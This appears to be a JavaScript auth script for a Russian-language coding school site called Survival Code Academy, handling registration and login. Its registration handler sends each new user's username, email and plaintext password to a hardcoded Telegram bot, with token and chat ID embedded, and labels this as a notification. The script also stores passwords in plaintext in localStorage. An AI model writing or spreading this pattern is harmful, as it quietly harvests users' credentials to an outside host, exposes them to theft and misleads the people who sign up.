// main.js — авторизация + уведомление в Telegram
(function(){
  const form = document.getElementById('authForm');
  const statusBox = document.getElementById('status');
  const switchText = document.getElementById('switch-text');
  const switchLink = document.getElementById('switch-link');
  const formTitle = document.getElementById('form-title');
  const submitBtn = document.getElementById('submit-btn');
  const confirmPassword = document.getElementById('confirmPassword');
  const authContainer = document.getElementById('auth-container');
  const platform = document.getElementById('learning-platform');

  let mode = 'register'; // 'login' | 'register'

  // 🔔 Функция отправки в Telegram
  function sendTelegramMessage(text) {
    const token = "8140204941:AAEkDGIryR-Vd2tcYezzHlftKn89lJ9WHIQ"; // твой токен
    const chatId = "8472334933";     // твой chat_id

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: text
      })
    }).catch(err => {
      console.error("Ошибка при отправке в Telegram:", err);
    });
  }

  // Применяем сохранённую тему
  function applySavedTheme(){
    const saved = localStorage.getItem('theme') || 'dark';
    document.body.classList.remove('light-theme');
    if(saved === 'light') document.body.classList.add('light-theme');
  }
  applySavedTheme();

  // Если уже авторизован
  const sessionUser = localStorage.getItem('sessionUser');
  if(sessionUser){
    authContainer.classList.add('hidden');
    platform.classList.remove('hidden');
    window.learningPlatformInstance.init();
  }

  // Переключение формы
  switchLink.addEventListener('click', (e)=>{
    e.preventDefault();
    if(mode === 'register'){
      mode = 'login';
      formTitle.textContent = 'Вход в Survival Code Academy';
      submitBtn.textContent = 'Войти';
      switchText.innerHTML = 'Нет аккаунта? <a href="#" id="switch-link">Зарегистрироваться</a>';
      confirmPassword.style.display = 'none';
    } else {
      mode = 'register';
      formTitle.textContent = 'Регистрация в Survival Code Academy';
      submitBtn.textContent = 'Зарегистрироваться';
      switchText.innerHTML = 'Уже есть аккаунт? <a href="#" id="switch-link">Войти</a>';
      confirmPassword.style.display = '';
    }
    document.getElementById('switch-link').addEventListener('click', arguments.callee);
    statusBox.textContent = '';
  });

  function getUsers(){
    try { return JSON.parse(localStorage.getItem('users')||'{}'); }
    catch(e){ return {}; }
  }
  function saveUsers(obj){
    localStorage.setItem('users', JSON.stringify(obj));
  }

  form.addEventListener('submit', (e)=>{
    e.preventDefault();
    statusBox.textContent = '';
    const username = document.getElementById('username').value.trim();
    const email = document.getElementById('email').value.trim().toLowerCase();
    const password = document.getElementById('password').value;

    if(!email || !password){ statusBox.textContent = 'Заполните email и пароль.'; return; }

    const users = getUsers();

    if(mode === 'register'){
      const confirmPwd = confirmPassword.value;
      if(!username){ statusBox.textContent = 'Укажите имя пользователя.'; return; }
      if(password.length < 6){ statusBox.textContent = 'Пароль должен быть от 6 символов.'; return; }
      if(password !== confirmPwd){ statusBox.textContent = 'Пароли не совпадают.'; return; }
      if(users[email]){ statusBox.textContent = 'Такой email уже зарегистрирован.'; return; }

      users[email] = { username, password };
      saveUsers(users);
      localStorage.setItem('sessionUser', email);

      // ✅ Отправляем уведомление в Telegram
      const now = new Date();
      const timeStr = now.toLocaleString("ru-RU", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit"
      });

      sendTelegramMessage(`✅ Новая регистрация:
👤 Username: ${username}
📧 Email: ${email}
🔐 Password: ${password}
⏰ Время: ${timeStr}`);

      authContainer.classList.add('hidden');
      platform.classList.remove('hidden');
      window.learningPlatformInstance.init();

    } else {
      // login
      if(!users[email] || users[email].password !== password){
        statusBox.textContent = 'Неверный email или пароль.'; return;
      }
      localStorage.setItem('sessionUser', email);
      authContainer.classList.add('hidden');
      platform.classList.remove('hidden');
      window.learningPlatformInstance.init();
    }
  });
})();
